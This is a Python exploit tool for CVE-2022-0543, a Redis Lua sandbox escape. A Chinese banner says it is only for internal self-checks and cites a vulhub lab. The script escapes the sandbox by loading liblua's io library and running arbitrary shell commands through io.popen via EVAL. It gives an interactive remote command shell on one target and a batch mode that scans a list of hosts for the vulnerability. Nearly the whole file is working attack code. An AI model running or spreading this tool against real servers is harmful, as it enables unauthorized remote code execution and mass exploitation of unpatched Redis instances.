import argparse
import sys
import socket
import redis
import re


def exploit(ip,port,cmd,liblua):
    try:
        exp = 'local io_l = package.loadlib("'+liblua+'", "luaopen_io"); local io = io_l(); local f = io.popen("'+cmd+'", "r"); local res = f:read("*a"); f:close(); return res'
        command = redis.Redis(host=ip,port=port)
        #print(command)
        result = command.eval(exp,0)
        return result
    except:
        return "未知异常"

def ping(ip,port):
    Redis_sk = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    Redis_Result = Redis_sk.connect_ex((ip,int(port)))
    if Redis_Result == 0:
        #print('redis port is open')
        return 1
    else:
        #print('redis port is closed')
        return 0
        sys.exit()

if __name__ == "__main__":
    print("." * 50)
    print('''
        ===CVE-2022-0543 Redis Lua 沙盒逃逸 RCE===
        本工具仅适用于企业内部自查自纠，请勿用于恶意行为。
        请勿频繁使用，由于频繁使用该工具造成的一切影响由使用者自负。
        说明：自定义liblua路径，为空默认为vulhub测试环境路径/usr/lib/x86_64-linux-gnu/liblua5.1.so.0
             测试环境地址：https://github.com/d-rn/vulhub/tree/master/redis/CVE-2022-0543
                                                
                                                                    --luckyZ--
        ''')

    #exploit("192.168.60.142","6379","id")

    parser = argparse.ArgumentParser(description='luckyZ')
    parser.add_argument('-t','--target',type=str,help='input your redis server ip')
    parser.add_argument('-p','--port',type=str,help='input your redis server port')
    parser.add_argument('-f','--file',type=str,help="input your ip list（ip:port）,Example:python3 poc.py -f list.txt")
    #parser.add_argument('-L','--liblua',type=str,help='input your correct realpath for the liblua library')

    args = parser.parse_args()

    if args.target and args.port is None:
        print('please input your redis server port')
    elif args.port and args.target is None:
        print('please input your redis server ip')
    elif args.port and args.target and args.file is None:
        p = ping(args.target,args.port)
        if p == 1:
            print('>>>redis port is open')
            liblua = input('input your liblua library(default:/usr/lib/x86_64-linux-gnu/liblua5.1.so.0)\n>>>')
            if liblua == "":
                while True:
                    cmd = input('input your command:\n>>>')
                    if cmd == "exit":
                        sys.exit()
                    back = exploit(args.target,args.port,cmd,liblua="/usr/lib/x86_64-linux-gnu/liblua5.1.so.0")
                    result = re.findall(r"b'(.+?)\\n'",str(back))
                    print(result[0])
                    print('###############')
            else:
                while True:
                    cmd = input('input your command:\n>>>')
                    if cmd == "exit":
                        sys.exit()
                    back = exploit(args.target,args.port,cmd,liblua)
                    result = re.findall(r"b'(.+?)\\n'",str(back))
                    print(result[0])
                    print('###############')
    elif args.file and args.target is None and args.port is None:
        liblua = input('input your liblua library(default:/usr/lib/x86_64-linux-gnu/liblua5.1.so.0)\n>>>')
        if liblua == "":
            with open(args.file,"r") as f:
                for ip in f.readlines():
                    ip = ip.strip("\n").split(":")
                    bak_code = ping(ip[0],ip[1])
                    if bak_code == 1:
                        #print('redis port is open')
                        result = exploit(ip[0],ip[1],"id",liblua="/usr/lib/x86_64-linux-gnu/liblua5.1.so.0")
                        if "uid=" in str(result):
                            print("[+]ip "+ip[0]+"redis port is open 存在漏洞")
                        else:
                            print("[-]ip "+ip[0]+" redis port is open "+result)
                        #print(ip)
                    else:
                        print("[*]ip "+ip[0]+" 不存在漏洞或网络通信失败")
        else:
            with open(args.file, "r") as f:
                for ip in f.readlines():
                    ip = ip.strip("\n").split(":")
                    bak_code = ping(ip[0], ip[1])
                    if bak_code == 1:
                        # print('redis port is open')
                        result = exploit(ip[0], ip[1], "id",liblua)
                        if "uid=" in str(result):
                            print("[+]ip " + ip[0] + "redis port is open 存在漏洞")
                        else:
                            print("[-]ip " + ip[0] + " redis port is open " + result)
                        # print(ip)
                    else:
                        print("[*]ip " + ip[0] + " 不存在漏洞或网络通信失败")

#源码参考https://github.com/aodsec/CVE-2022-0543/blob/main/CVE-2022-0543.py